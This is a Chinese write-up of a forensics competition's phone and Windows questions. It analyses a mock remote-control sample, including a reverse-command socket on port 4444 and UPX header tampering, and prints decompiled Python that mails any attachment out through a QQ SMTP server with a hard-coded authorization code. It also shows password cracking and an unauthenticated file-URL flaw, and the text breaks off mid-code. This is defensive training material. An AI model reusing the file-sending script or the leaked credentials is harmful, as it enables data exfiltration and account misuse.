@@ -1,0 +1,3665 @@
+第三届 龙信杯电子数据取证大赛 题解 - XD Forensics Wiki
+https://forensics.xidian.edu.cn/writeups/Longxin2025/
+
+第三届 龙信杯电子数据取证大赛 题解
+¶
+Author
+NoahTie @ tratra 什么都会
+比赛信息
+¶
+案情简介
+¶
+本次龙信杯竞赛案情脱胎于 2025 年初的某地知名网络小说知识产权案, 涉案团伙通过非法爬取小说内容, 盗用其付费内容并投放至其自行开发的微信小程序, 通过观看广告非常牟利, 造成原平台巨额经济损失. 龙信受邀参与案件支撑并成功为司法机关提供了关键证据, 助力案件顺利告破.
+本次龙信杯案情:
+自 2023 年起, "终点小说"公司(以下统称"甲公司")发现, 张大运营的"芯龙小说"软件未获甲公司授权, 利用网络爬虫技术非法抓取、传播甲公司旗下多部热门小说. 涉案作品为甲公司独家授权并付费推广的优质内容, 甲公司依法享有信息网络传播权, 张大的行为已严重侵害甲公司及作者的著作权.
+2025 年 10 月 22 日, 甲公司向张大发送律师函, 要求其立即停止侵权、删除全部侵权内容. 张大仅删除部分作品, 随后仍持续抓取、传播其他小说, 侵权行为具有连续性. 面对持续损害甲公司及作者权益和经济损失, 决定向公安机关报案, 揭露并制止这一恶劣的犯罪行为.
+容器信息
+¶
+容器密码:
+MjAyNS3oi4/lt57pvpnkv6E=
+容器 MD5:
+5b3020c1a3c725febdc8a8bc84f42909
+写在前面
+¶
+这次比赛的检材整体难度较高并且题量也较大, 比赛时做下来最大的感受是时间不够, 有很多地方来不及细想. 但至少不同的检材之间还是有连续的案情的(除了流量包之外). 检材之间也有少量交互, 但整体还是线性关联: 手机和服务器上都有一些计算机检材需要的信息.
+手机取证部分单论自动分析工具(火眼)的分析情况来看, 相当有往年美亚杯的手机的感觉了, 应用几乎都不能自动解析, 需要靠查看应用数据进行手动分析.
+计算机取证部分一部分题目有点离谱了, 在完全没有提示的情况下出了一道图片隐写, 不过好在和这部分相关的题目也就只有 1 道. 小说文本对照部分的题目完全可以交给 LLM Agent 自动解题. 整体难度算中等吧.
+服务器部分太乱了, 感觉出题人在出提前没有想好要出什么, 导致东一块西一块.
+流量部分考了入侵分析, 比较难的部分是 CS 流量分析.
+手机取证
+¶
+大致浏览一下安装的应用列表, 里面有雷电模拟器预装的应用, 是个从雷电模拟器提取的镜像.
+顺便跑一下 APP 包名识别:
+Package Name
+App Name
+Genre
+Source
+com.baidu.appsearch
+百度手机助手
+应用商店
+应用宝
+com.zhulang.reader
+逐浪小说
+图书阅读
+小米应用商店
+com.bfengtech.diange.diangeapp
+电鸽
+聊天社交
+小米应用商店
+com.UCMobile
+UC浏览器-随心搜·免费看
+实用工具
+小米应用商店
+com.ss.android.ugc.aweme
+抖音
+影音视听
+小米应用商店(Cached)
+com.lemon.lv
+剪映
+摄影摄像
+小米应用商店
+com.jiandan.terence.sneaker
+微秘相册-原私密相册
+摄影摄像
+小米应用商店
+com.baidu.newapp
+文心-(文小言)
+聊天社交
+小米应用商店
+com.yueyou.adreader
+阅友免费小说
+图书阅读
+小米应用商店
+com.shuqi.controller
+书旗小说-海量图书
+图书阅读
+小米应用商店
+com.moonshot.kimichat
+Kimi-K2长思考上线
+实用工具
+小米应用商店
+com.tencent.mm
+微信
+聊天社交
+小米应用商店(Cached)
+需要注意的是其中的
+com.jiandan.terence.sneaker(微秘相册-原私密相册)
+.
+01 请问机身的 Wi-Fi 信号源的物理地址
+¶
+答案
+00:db:60:6e:86:13
+火眼有分析出来 2 条 WiFi 记录, 一条是雷电模拟器虚拟出来的 WiFi 连接(Cisco-MVlps), 一条是 AP 的信息:
+WiFi 是有 MAC 地址的, AP 没有 MAC 地址, 但感觉题目在问的似乎是 AP 的 MAC 地址.
+之后的分析已经知道这个镜像是从雷电模拟器的虚拟机提取的, 并且知道安卓系统的版本是安卓 9, 可以创建一个虚拟机验证答案. 以下是我从雷电模拟器的虚拟机提取的镜像中的文件与系统设置的对比:
+已连接的虚拟 WiFi 的 MAC 地址与 BSSID 信息一致, 并未使用随机的 MAC 地址:
+由于模拟器的设置是简化版的设置, 删除了一些 Activity 的入口, 因此需要通过类似 ActivityManager 的应用来直接启动设置 WLAN 热点的 Activity 才能看到热点密码的设置:
+所以应该是题目描述有些模糊, 看题目描述还以为在问 AP 的 MAC 地址. 改成"手机连接的 WiFi 的 MAC 地址"就没有歧义了.
+因此可以推断检材中 WiFi 实际的 MAC 地址为
+/misc/wifi/WifiConfigStore.xml
+中的 BSSID
+00:db:60:6e:86:13
+:
+02 请问张大的手机号码尾号是 3807 的手机号码
+¶
+答案
+15680193807
+在 Kimi 的分析结果中能看到中间隐去 4 位的电话号码
+156****3807
+:
+用 XWF 加载解压出来的检材文件夹, 在同步搜索中用正则搜索:
+在电鸽 APP 的配置文件里面存储有用户的手机号码:
+XWF 的正则规则与 Perl 和 grep 一致, 可以参考:
+Regular expressions in grep with examples
+03 通讯录中号码归属地最多的直辖市
+¶
+答案
+北京市
+直辖市一共就几个, 挨个筛选一下, 明显北京的号码是最多的:
+04 嫌疑人最近卸载过的的一款小说 APP 的名字
+¶
+答案
+七猫免费小说
+在安卓的软件包缓存目录中可以看到软件包的缓存数据:
+将其中的第三方包的条目导出为 CSV, 提取包名, 再运行一次 APP 识别, 发现其中有一个
+com.kmxs.reader(七猫免费小说)
+Package Name
+App Name
+Genre
+Source
+com.UCMobile
+UC浏览器-随心搜·免费看
+实用工具
+小米应用商店(Cached)
+com.baidu.appsearch
+百度手机助手
+应用商店
+应用宝(Cached)
+com.baidu.newapp
+文心-(文小言)
+聊天社交
+小米应用商店(Cached)
+com.bfengtech.diange.diangeapp
+电鸽
+聊天社交
+小米应用商店(Cached)
+com.jiandan.terence.sneaker
+微秘相册-原私密相册
+摄影摄像
+小米应用商店(Cached)
+com.kmxs.reader
+七猫免费小说
+图书阅读
+小米应用商店
+com.larus.nova
+豆包
+实用工具
+小米应用商店(Cached)
+com.lemon.lv
+剪映
+摄影摄像
+小米应用商店(Cached)
+com.moonshot.kimichat
+Kimi-K2长思考上线
+实用工具
+小米应用商店(Cached)
+com.shuqi.controller
+书旗小说-海量图书
+图书阅读
+小米应用商店(Cached)
+com.ss.android.ugc.aweme
+抖音
+影音视听
+小米应用商店(Cached)
+com.tencent.mm
+微信
+聊天社交
+小米应用商店(Cached)
+com.tencent.mtt
+QQ浏览器-QBot AI智能体
+实用工具
+小米应用商店(Cached)
+com.yueyou.adreader
+阅友免费小说
+图书阅读
+小米应用商店(Cached)
+com.zhulang.reader
+逐浪小说
+图书阅读
+小米应用商店(Cached)
+sogou.mobile.explorer
+搜狗浏览器极速版
+实用工具
+小米应用商店
+另外还可以看到有
+sogou.mobile.explorer
+(搜狗浏览器极速版)
+com.larus.nova
+(豆包)
+com.tencent.mtt
+(QQ浏览器-QBot AI智能体)被删除.
+05 嫌疑人使用"逐浪小说"应用最近一次搜索小说书名
+¶
+答案
+从斗罗开始无敌
+解法 1: 通过应用数据库
+设备上安装有 HttpCanary, 一个安卓平台(现在也有 Windows 平台版本)的抓包工具, 主要捕获 HTTP/HTTPS 协议流量:
+在设备的用户自定义证书存储目录中也可以看到安装有 HttpCanary 的根证书:
+在 HttpCanary 的数据目录
+/data/com.guoshi.httpcanary/databases
+中的数据库
+app
+中存放着抓包的历史记录, 其中:
+表
+CAPTURE_SESSION
+存储着用户每次运行抓包捕获到的包的 UUID
+表
+HTTP_CAPTURE_RECORD
+中保存着抓到的每个包的信息
+可以看到, 其中的
+APP
+字段是该流量包是哪个 APP 包名传输的.
+在
+APP
+字段中中过滤
+com.zhulang.reader
+包名, 在
+URL
+字段中过滤
+search
+:
+将数据库中访问的 URL 复制出来, 在 Cyberchef 里面处理(URL 解码, 正则匹配查找关键词):
+数据库中越靠后的条目创建时间越晚, 也可以根据
+TIME
+字段的时间戳来判断.
+解法 2: 通过缓存
+这道题也可以通过查看 HttpCanary 存储在
+/media/0/Android/data/com.guoshi.httpcanary/cache
+目录的缓存完成.
+在逐浪小说的官网搜索一下, 看看访问的 URI:
+去缓存里搜索
+/search/index.html
+:
+搜索这几个文件:
+http_req_ea384113-d336-438a-a50d-ae3094ebf18e.hcy
+http_req_1b0f44e9-0bda-43b7-9177-caffc84c56a4.hcy
+http_req_79656dfd-1c6e-4841-96cd-8fadef089218.hcy
+http_req_5221af36-35a0-44e8-812b-8451a81f2690.hcy
+(最新)
+http_req_1b59c69c-7e4b-472e-ba63-badc5af0e8c3.hcy
+URL 解码:
+06 嫌疑人曾使用"QQ 浏览器"使用过的搜索关键词有几个
+¶
+答案
+27
+参考第 4 题的分析, 设备上曾经安装过 QQ 浏览器, 但是已经被删除. 因此数据目录也应该被清除了.
+在该字段中过滤 QQ 浏览器的包名
+com.tencent.mtt
+:
+可以看到用户使用的搜索引擎是搜狗
+m.sogou.com
+, 可以访问一下移动端的搜狗看一下搜索的 URI 和关键词的 GET 参数名是什么, 发现访问的路由是
+/web/SearchList.jsp
+, GET 请求的参数是
+keyword
+. 据此, 在数据库中过滤:
+把数据库里访问的 URL 复制出来, 在 Cyberchef 里面处理(URL 解码, 正则匹配查找关键词, 去重):
+一共搜索过 27 个不同的关键词.
+这道题也可以通过查看 HttpCanary 存储在
+/media/0/Android/data/com.guoshi.httpcanary/cache
+目录的缓存完成, 但这样的话缺失了 HTTP 流量来源应用的信息, 不是很严谨.
+07 嫌疑人曾经安装过的一款 AI 软件登录的用户名
+¶
+答案
+用户885861
+题目中专门表明"曾安装", 也就是现在已经删除的应用. 参考第 4 题的分析, 设备上还有
+com.larus.nova
+(豆包)被删除, 符合题目的描述.
+在 HttpCanary 的数据库中过滤
+APP
+字段, 发现有豆包 APP 的流量:
+浏览几条流量, 发现请求的参数中都包含
+user_is_login
+, 值为 0 或 1, 推测是标识用户是否登录. 在
+URL
+字段中过滤
+user_is_login=1
+, 找到登录后发送的第一个请求,
+SESSION_ID
+为
+89fb4e70-fdd6-424f-8cdd-b965f576a7b8
+:
+这里可以看到 UID 是
+1197846826330169
+, 但是看不到用户名. 需要去 HttpCanary 的缓存目录中寻找完整的响应包. 在目录中搜索获得的 UID. 由于 URL 中也包含 UID, 观察响应体的 JSON 可以发现, 服务端返回的 UID 是字符串的形式, 因此可以在搜索时为 UID 的前后加上英文的引号, 排除仅 URL 包含 UID 的文件:
+08 接上问, 嫌疑人在此 AI 软件中最后一次提问的内容
+¶
+答案
+小说爬取会侵权嘛
+接上题. 翻看一些包含 UID 的响应包, 发现了对用户问题的回答:
+根据文件名在数据库中找到对应的请求, 找到请求的 URL 为
+https://api-normal.doubao.com/im/chain/single
+:
+在数据库中过滤该 URL, 找到最后一条请求:
+在缓存中搜索文件名与该请求的
+SESSION_ID
+一致的文件:
+一个是请求, 一个是响应, 查看响应. 然而这个包是空的, 只有豆包的推荐内容.
+再往前看一条:
+Cyberchef 格式化一下 JSON:
+可以看到用户提问的内容是"小说爬取会侵权嘛", 而且是通过语音提问的(问题内容出现在
+tts_content
+中).
+09 嫌疑人花费多少元购买小说网站源码
+¶
+答案
+1300
+参考第 4 题, 设备中安装有即时通讯软件
+com.bfengtech.diange.diangeapp
+(电鸽), 可惜火眼目前还没有该应用的解析插件, 只能手动分析了.
+在数据目录可以看到包含"flutter"字样的文件夹, 推断该应用使用了 Flutter 框架. 在 Flutter 应用中, Flutter 框架内部的数据保存在
+app_flutter
+目录中. 在该目录中存放着 APP 的数据库
+OpenIM_v3_uid_1757820856679172.db
+.
+数据库中一共有 2 个包含消息记录的表. 其中一张表中可以看到关于购买网站源码的记录:
+10 接上问, 嫌疑人购买的小说网站源码的 MD5 值
+¶
+答案
+5a312a2cd50493f908a4f905f2d9ed2d
+接上题, 这里发送了 4 个非文本的消息, 第 1 条是软件内置的表情包, 后 3 条均为文件:
+可以在应用的数据目录
+/media/0/Android/data/com.bfengtech.diange.diangeapp/files/diange/files/
+中找到这些文件:
+然而这些文件还有另外一种获取方式. 由于电鸽的 API 并没有对访问做任何鉴权, 只要拿到文件的 URL, 任何人都可以直接下载这些文件:
+并且 URL 中没有任何混淆或哈希处理, 格式为
+https://v3.api.production.diangeapp.com/api/object/uid_<上传文件的用户的 UID>/<文件名>
+, 存在路径枚举及未授权访问的漏洞. 真好, 打取证比赛顺便还报了个漏洞.
+算一下文件的哈希:
+11 嫌疑人的虚拟钱包地址
+¶
+答案
+0x2a80985eea4283fdebddc5ec25c15d8cb5bcc09f
+在另外 1 个聊天记录表里:
+可以拿到卖家的钱包地址为
+0x099097e9497de4de96effccd9f5ccb76822095d2
+.
+使用的虚拟货币是 USDT, 去
+TokenView
+查一下这个地址:
+可以看到疑似与嫌疑人的钱包地址转账的记录(复盘时是比赛后的第 2 天, 2025-11-10 14:00 左右):
+查看转入的那条交易的信息:
+嫌疑人表示钱已转过去时是
+2025-10-23 09:50:22
+, 转账发生在
+2025-10-23 09:47:23
+, 交易记录与聊天记录的时间先后顺序也能对上:
+紧挨着的转出交易, 卖家又将收到的虚拟货币通过 Coinhako(一个新加坡的虚拟货币交易平台)卖出, 时间是
+2025-10-23 09:57:11
+:
+12 嫌疑人购买视频网站源码花费了多少 USDT
+¶
+答案
+1000
+参考上题.
+13 其接受过一个远控木马程序, 请问其 MD5 值
+¶
+答案
+f3399f9b9ede9601edb648a2abe4a090
+参考第 10 题. 远控木马明显是在
+yuankong（123456，不要在本机运行）.zip
+中, 解压得到 1 个 PE 文件(拿到疑似恶意程序的第一件事: 修改扩展名, 以防误运行):
+奇怪的是火绒这次居然没有报毒, 根据后续的分析判断, 这个程序其实不具有恶意功能, 只是模仿了一些远控的行为.
+14 接上题, 该 exe 使用了哪种压缩方式
+¶
+答案
+UPX
+PE 的压缩方式第一反应就是 UPX. 用 DIE 查看信息:
+这里可以看到一些不太正常的结果:
+首先, DIE 识别出来了 UPX 的特征, 但是没能确定具体的版本, 只能根据特征判断是
+UPX >= 3.91
+.
+其次, Heur 识别出来了 PE 文件被打包,
+EntryPoint
+(Load 指令)和导入表很像 UPX, 但 UPX 的节是损坏了的, 变成了
+VMP
+, 并且在
+rsrc
+节中是被压缩的数据.
+到这里, 很像前两年西电的 MoeCTF 里出过的一道题, 也是对 UPX 压缩的 PE 进行了修改, 但是那道题是修改了 Load 指令的部分, 导致 DIE 查出来类似的报错.
+010 Editor 打开, 跑一下 PE 文件的模板:
+Section Header 明显是被改过了, 把
+UPX
+改成了
+VMP
+, 顺便还能看到 UPX 的具体版本是 4.10.
+15 接上题, 该 exe 使用的压缩方式修改了几处特征
+¶
+答案
+3
+见上题.
+16 接上题, 该 exe 外联的端口号
+¶
+答案
+4444
+接上题.
+把
+VMP
+改回
+UPX
+. 改完之后再跑一次模板, 一切正常:
+用 UPX4.10 去壳:
+如果这里因为之前在 DIE 中看到了 Pyinstaller 的特征直接去用 Pyinstxtractor 解包的话, 可以直接解出来
+rsrc
+里的另外 1 个 PE 文件, 也就是之后提到的被释放出来的 exe, 这个释放出来的文件才是 Pyinstaller 打包的. 而原本的 PE 文件并非 Pyinstaller 打包的.
+使用 IDA 加载去壳后的文件, 找到
+main
+函数. 可以看到应用创建了一个新的线程:
+跟进新线程的函数
+post_pgo_initialization
+, 里面也是调用了一个函数, 继续跟进
+sub_1400019B0
+:
+开了个 Socket 连接, ip 地址是
+192.168.93.129
+, 端口是
+4444
+. 之后看起来会远程接受 Socket 传入的数据, 作为命令通过 cmd 执行:
+但是感觉代码写的不太对劲, 执行命令的代码全放在 while 循环的外面了, 也就是只有 Socket 连接断前最后一次传输的指令才会被运行. 而且
+main
+里面刚创建完 Socket 通信的线程就给 CloseHandle 了...
+17 接上题, 该 exe 会搜索并加密几种类型的文件
+¶
+答案
+3
+在字符串视图里可以看到相关的文件扩展名:
+找到调用字符串的函数:
+呃...创建了个
+C:\\test\\EncryptedDocs
+目录, 然后在函数参数
+a1
+传入的目录里递归遍历文件, 如果文件名的符合
+*.doc
+*.xlsx
+*.docx
+格式, 则用
+sub_140001230
+函数处理文件. 而
+sub_140001230
+的功能是, 将文件的原本内容复制到参数
+a1
+目录中, 添加
+.enc
+扩展名. 我算是知道为啥火绒没报毒了.
+18 接上题, 该 exe 会释放一个新的 exe, 请问新的 exe 是用哪种编程语言编写的
+¶
+答案
+Python
+主函数中的
+sub_1400017B0
+函数用于加载资源并将
+EXE
+资源写入到
+%TEMPDIR%/mail.exe
+目录中. 接着运行该程序.
+可以使用 010 Editor 直接导出该应用:
+用 DIE 查看信息:
+19 接上题, 释放出的 exe 使用的邮件服务器的授权码
+¶
+答案
+qycirqwzxogjdgbh
+接上题. 使用 Pyinstxtractor 解包:
+根据解包过程中的信息, 程序的入口点应该是
+test.pyc
+.
+用 Pylingual 反编译
+test.pyc
+, 得到源码:
+Python
+import
+itertools
+import
+hashlib
+import
+string
+import
+sys
+from
+math
+import
+gcd
+from
+Crypto.Util.number
+import
+*
+import
+gmpy2
+import
+smtplib
+from
+email.mime.text
+import
+MIMEText
+from
+email.mime.multipart
+import
+MIMEMultipart
+from
+email.mime.application
+import
+MIMEApplication
+from
+email.header
+import
+Header
+import
+os
+def
+send_email
+(
+sender
+,
+password
+,
+receiver
+,
+subject
+,
+body
+,
+attachment_path
+=
+None
+,
+smtp_server
+=
+'smtp.qq.com'
+,
+smtp_port
+=
+465
+):
+"""
+发送带附件的邮件
+:param sender: 发件人邮箱
+:param password: 发件人邮箱授权码（不是登录密码）
+:param receiver: 收件人邮箱（字符串或列表）
+:param subject: 邮件主题
+:param body: 邮件正文
+:param attachment_path: 附件文件路径（可选）
+:param smtp_server: SMTP 服务器地址
+:param smtp_port: SMTP 端口（默认 465 SSL）
+"""
+message
+=
+MIMEMultipart
+()
+message
+[
+'From'
+]
+=
+Header
+(
+sender
+)
+message
+[
+'To'
+]
+=
+Header
+(
+receiver
+if
+isinstance
+(
+receiver
+,
+str
+)
+else
+', '
+.
+join
+(
+receiver
+))
+message
+[
+'Subject'
+]
+=
+Header
+(
+subject
+,
+'utf-8'
+)
+message
+.
+attach
+(
+MIMEText
+(
+body
+,
+'plain'
+,
+'utf-8'
+))
+if
+attachment_path
+and
+os
+.
+path
+.
+exists
+(
+attachment_path
+):
+with
+open
+(
+attachment_path
+,
+'rb'
+)
+as
+f
+:
+part
+=
+MIMEApplication
+(
+f
+.
+read
+())
+part
+.
+add_header
+(
+'Content-Disposition'
+,
+'attachment'
+,
+filename
+=
+os
+.
+path
+.
+basename
+(
+attachment_path
+))
+message
+.
+attach
+(
+part
+)
+elif
+attachment_path
+:
+print
+(
+f
+'⚠️ 附件路径不存在：
+{
+attachment_path
+}
+'
+)
+try
+:
+with
+smtplib
+.
+SMTP_SSL
+(
+smtp_server
+,
+smtp_port
+)
+as
+smtp
+:
+smtp
+.
+login
+(
+sender
+,
+password
+)
+smtp
+.
+sendmail
+(
+sender
+,
+receiver
+if
+isinstance
+(
+receiver
+,
+list
+)
+else
+[
+receiver
+],
+message
+.
+as_string
+())
+print
+(
+'✅ 邮件发送成功！'
+)
+except
+Exception
+as
+e
+:
+return
+None
+if
+__name__
+==
+'__main__'
+:
+sender_email
+=
+'2934235261@qq.com'
+sender_auth_code
+=
+'qycirqwzxogjdgbh'
+receiver_email
+=
+sys
+.
+argv
+[
+1
+]
+attachment_path
+=
+sys
+.
+argv
+[
+2
+]
+send_email
+(
+sender
+=
+sender_email
+,
+password
+=
+sender_auth_code
+,
+receiver
+=
+receiver_email
+,
+subject
+=
+'Python 自动发送邮件测试'
+,
+body
+=
+'你好，这是一封 Python 自动发送的测试邮件。
+\n
+附件请查收。'
+,
+attachment_path
+=
+attachment_path
+,
+smtp_server
+=
+'smtp.qq.com'
+,
+smtp_port
+=
+465
+)
+很明显功能就是发送邮件.
+20 嫌疑人发布的抖音作品是参考哪篇文学巨著生成的
+¶
+答案
+钢铁是怎样炼成的
+在抖音的分析结果中可以看到几条发布的作品, 查看之后发现内容是小说:
+在 Kimi 的分析结果中, 可以看到用户用 Kimi 生成的小说原文, 是参考《钢铁是怎样炼成的》生成的:
+21 嫌疑人通过抖音发布了几个作品
+¶
+答案
+5
+见上题.
+22 接上题, 作品 ID 为 7564293625007115554 的观众浏览量为
+¶
+答案
+23
+用作品 ID 在抖音的数据目录中爆搜:
+找到的文件里面是 JSON 格式的数据, 用 VSCode 打开, 再次搜索, 翻了一会儿找到了:
+23 嫌疑人相册中的图片为其非法所得, 是多少(不考虑重复)
+¶
+本题暂无答案
+本题暂无答案
+一堆图片...找找有没有比较好的统计方法.
+24 嫌疑人电脑的开机密码
+¶
+答案
+qwe321@@@
+设备中还有 1 个没有识别出来的应用, 看包名是个备忘录 APP:
+在应用的数据目录中可以看到电脑密码和 BitLocker 密码:
+计算机取证(Windows)
+¶
+01 PowerShell 中多少个命令包含 URL 地址
+¶
+答案
+5
+火眼的终端历史记录分析结果中, 搜索"http":
+02 VeraCrypt 加密容器密码
+¶
+答案
+UJw4FspAsmNVRACWf4GQazvd
+容器很好找, 不管是查找检材中的大文件, 用火眼的特征分析, 还是跟我一样习惯性地先浏览用户文件夹, 都可以找到加密容器:
+容器的密码在剪贴板的固定项中, 需要仿真后按下
+Win + V
+才能看到:
+Windows 剪切板的数据不会保存, 在关机后会清空. 但剪切板中的固定项会被保存下来. 数据的保存目录是
+C:/Users/Administrator/AppData/Local/Microsoft/Windows/Clipboard/Pinned/
+, 但是数据被加密:
+我查到的资料说这部分文件加密使用的算法是 Windows CryptoAPI 里的 CNG 算法, 使用的参数包括用户的 SID, 用户密码, MasterKeyFile(存储在
+/Users/Administrator/AppData/Roaming/Microsoft/Crypto/Keys
+目录)但是目前还没有成功解密.
+03 加密容器中"密码本.txt"文件的 SHA-256 哈缩希值
+¶
+答案
+4fc75a56a7c3e08b3f6d1c018d366a9139422b4c3c09f367dd64aca2b18e3fc7
+挂载 VeraCrypt 容器之后, 用 FTK Imager 或火眼加载容器卷, 在回收站中可以看到密码本文件:
+导出之后计算哈希值:
+04 接上题, 分析其账单数据中哪个类别的金额最多
+¶
+答案
+小说网站
+用密码本中的口令爆破 VC 容器中的"账单数据.zip".
+zip2john 导出哈希:
+编辑导出的哈希, 去掉首尾的文件名和冒号. HashCat 爆破:
+得到解压密码是
+VteGElLDQu
+. 或者也可以用 Passware, 添加一下字典就行.
+解压之后里面有 30 个 Excel 表格文件, 比较多, 内容大概是:
+这里提供 2 种统计的方法.
+第一种
+本地起一个 mysqld, Navicat 连接, 使用导入功能从 Excel 导入数据. 建议可以先导入 1 个表格, 自动创建好表结构. 之后再将其余表格数据导入到这张创建好的表中.
+查一下每类的金额总和:
+第二种
+用弘连的网矩数据分析工具.
+讲整个解压出来的文件夹导入, 文件预处理完成后选择合并文件, 使用图表功能生成柱状图:
+05 Bitlocker 的恢复密钥
+¶
+答案
+541079-719906-009438-610390-527406-567622-466598-347765
+这道题是真的想不到...
+和 VC 容器放在一起的还有几个图片文件, 其中的
+3.png
+的文件头是 webp 的文件头, 但是 magika 能识别到 PNG 的特征, binwalk 跑了一下里面塞了张 PNG 图片:
+打开的时候 IrfanView 报错了, 但是其他查看器又能打开, 应该是 CRC 校验没过:
+跑一下 PNG 宽高检查, 发现真实的高度应该是 442 像素:
+修改高度:
+里面隐写了个 BitLocker 的恢复密钥:
+06 嫌疑人使用的 Windows 激活工具的版本
+¶
+答案
+4.2.8
+用手机部分找到的密码或上道题找到的恢复密钥都可以解密计算机的 D 盘的 BitLocker. 在
+/Program Files/AAct/
+目录下是一个激活工具. 目录中包含一张截图, 可以看到版本号是
+4.2.8
+:
+在
+AAct.exe
+的属性中也可以看到:
+07 嫌疑人电脑中安装有除 VeraCrypt 之外的加密软件, 其版本是多少
+¶
+答案
+1.17.1
+在
+C:/Program Files/Cryptomator/Cryptomator.exe
+安装了 1 个加密工具(看应用名称大概就能猜出来):
+在仿真系统中运行, 查看关于信息:
+在
+C:/Program Files/Cryptomator/app/Cryptomator.cfg
+文件中也可以看到应用的具体版本:
+08 接上题, 该加密软件恢复秘钥文件最后一个单词
+¶
+答案
+accent
+WPS 文件访问记录中有一个"恢复密钥.docx":
+其中有一堆单词, 最后几个单词被设置成白色, 又是隐写:
+在仿真系统中运行 Cryptomator, 使用恢复密钥重置保险保险库的密码:
+之后用重置后的密码解锁并挂载保险库:
+09 mysql 数据库的存储路径
+¶
+答案
+D:/phpstudy_pro/Extensions/MySQL5.7.26/data/
+火眼的 MYSQL 解析分析结果里面可以看到数据库的存储路径:
+10 对比数据库与爬取小说数据, 数据库中缺少的小说其共有多少章节
+¶
+答案
+3
+直接使用火眼的数据库解析工具解析 MySQL 数据库, 可以看到数据库内
+chapters
+表内共 958 行数据:
+爬取的小说数据内有 961 个文件, 每个文件都是 1 个章节:
+11 嫌疑人爬取的小说共有多少汉字(包括繁体汉字, 不计标点符号)
+¶
+答案
+2946354
+这道题及之后的几道题目使用 Cline + GLM-4.6 完成.
+System Prompt:
+Markdown
+你将为用户提供 Python 代码编写和数据分析的支持. 在编写代码时, 需要注意:
+-
+不要生成注释
+-
+不要生成不必要的输出
+-
+严格遵守用户的功能需求
+-
+如果用户对概念的定义与实际定义有区别, 遵守用户给出的定义
+-
+编写的代码尽量遵守 Python 代码规范, 并且 Pythonic
+Prompt:
+Markdown
+统计当前文件夹及其子目录内所有txt文件中说共有多少汉字（包括繁体汉字，不计标点符号）
+生成的代码:
+Python
+import
+os
+import
+re
+from
+pathlib
+import
+Path
+def
+is_chinese_char
+(
+char
+):
+code_point
+=
+ord
+(
+char
+)
+if
+0x4e00
+<=
+code_point
+<=
+0x9fff
+:
+return
+True
+if
+0x3400
+<=
+code_point
+<=
+0x4dbf
+:
+return
+True
+if
+0x20000
+<=
+code_point
+<=
+0x2a6df
+:
+return
+True
+if
+0x2a700
+<=
+code_point
+<=
+0x2b73f
+:
+return
+True
+if
+0x2b740
+<=
+code_point
+<=
+0x2b81f
+:
+return
+True
+if
+0x2b820
+<=
+code_point
+<=
+0x2ceaf
+:
+return
+True
+if
+0xf900
+<=
+code_point
+<=
+0xfaff
+:
+return
+True
+return
+False
+def
+count_chinese_in_text
+(
+text
+):
+count
+=
+0
+for
+char
+in
+text
+:
+if
+is_chinese_char
+(
+char
+):
+count
++=
+1
+return
+count
+def
+count_chinese_in_file
+(
+file_path
+):
+try
+:
+with
+open
+(
+file_path
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+content
+=
+f
+.
+read
+()
+return
+count_chinese_in_text
+(
+content
+)
+except
+UnicodeDecodeError
+:
+try
+:
+# 尝试其他编码
+with
+open
+(
+file_path
+,
+'r'
+,
+encoding
+=
+'gbk'
+)
+as
+f
+:
+content
+=
+f
+.
+read
+()
+return
+count_chinese_in_text
+(
+content
+)
+except
+Exception
+as
+e
+:
+print
+(
+f
+"无法读取文件
+{
+file_path
+}
+:
+{
+e
+}
+"
+)
+return
+0
+except
+Exception
+as
+e
+:
+print
+(
+f
+"读取文件
+{
+file_path
+}
+时出错:
+{
+e
+}
+"
+)
+return
+0
+def
+scan_directory
+(
+directory
+):
+txt_files
+=
+[]
+directory_path
+=
+Path
+(
+directory
+)
+for
+file_path
+in
+directory_path
+.
+rglob
+(
+"*.txt"
+):
+txt_files
+.
+append
+(
+file_path
+)
+return
+txt_files
+def
+main
+():
+current_dir
+=
+"."
+txt_files
+=
+scan_directory
+(
+current_dir
+)
+total_chars
+=
+0
+file_stats
+=
+[]
+for
+file_path
+in
+txt_files
+:
+char_count
+=
+count_chinese_in_file
+(
+file_path
+)
+total_chars
++=
+char_count
+file_stats
+.
+append
+((
+file_path
+,
+char_count
+))
+print
+(
+f
+"总计:
+{
+total_chars
+:
+,
+}
+个汉字"
+)
+print
+(
+f
+"涉及文件数:
+{
+len
+(
+txt_files
+)
+}
+个"
+)
+dir_stats
+=
+{}
+for
+file_path
+,
+char_count
+in
+file_stats
+:
+dir_name
+=
+file_path
+.
+parent
+.
+name
+if
+dir_name
+not
+in
+dir_stats
+:
+dir_stats
+[
+dir_name
+]
+=
+0
+dir_stats
+[
+dir_name
+]
++=
+char_count
+for
+dir_name
+,
+char_count
+in
+sorted
+(
+dir_stats
+.
+items
+()):
+print
+(
+f
+"
+{
+dir_name
+}
+/:
+{
+char_count
+:
+,
+}
+个汉字"
+)
+if
+__name__
+==
+"__main__"
+:
+main
+()
+运行结果:
+在无法使用 LLM 的情况下可以在终端中运行:
+Bash
+cat
+./*/*.txt
+>
+all.txt
+将所有目录中的 txt 文件的内容整合到 1 个 txt 文件中. 使用任意编辑器打开这个 txt 文件, 通过替换功能将所有的中文全角标点(
+。
+，
+“
+”
+·
+‘
+’
+？
+！
+：
+；
+（
+）
+《
+》
+—
+)删除.
+再用 Word 等文字编辑工具查看文件的中文字符数统计:
+12 嫌疑人为躲避侵权, 将爬取文本中多个不同汉字分别替换成另一些汉字(如"我" -> "窝"), 分析共有多少个不同汉字被替换(相同字仅计一次)
+¶
+答案
+5
+Prompt:
+Markdown
+对比
+@/爬取
+-原本 和
+@/爬取
+-替换 中对应txt文件中共有多少个不同汉字被替换（相同字仅计一次）
+生成的代码:
+Python
+import
+os
+from
+pathlib
+import
+Path
+def
+is_chinese_char
+(
+char
+):
+code_point
+=
+ord
+(
+char
+)
+if
+0x4e00
+<=
+code_point
+<=
+0x9fff
+:
+return
+True
+if
+0x3400
+<=
+code_point
+<=
+0x4dbf
+:
+return
+True
+return
+False
+def
+count_unique_replacements
+():
+original_dir
+=
+"爬取-原本"
+replaced_dir
+=
+"爬取-替换"
+all_replacements
+=
+set
+()
+files_with_replacements
+=
+0
+for
+original_file
+in
+Path
+(
+original_dir
+)
+.
+rglob
+(
+"*.txt"
+):
+relative_path
+=
+original_file
+.
+relative_to
+(
+Path
+(
+original_dir
+))
+replaced_file
+=
+Path
+(
+replaced_dir
+)
+/
+relative_path
+if
+not
+replaced_file
+.
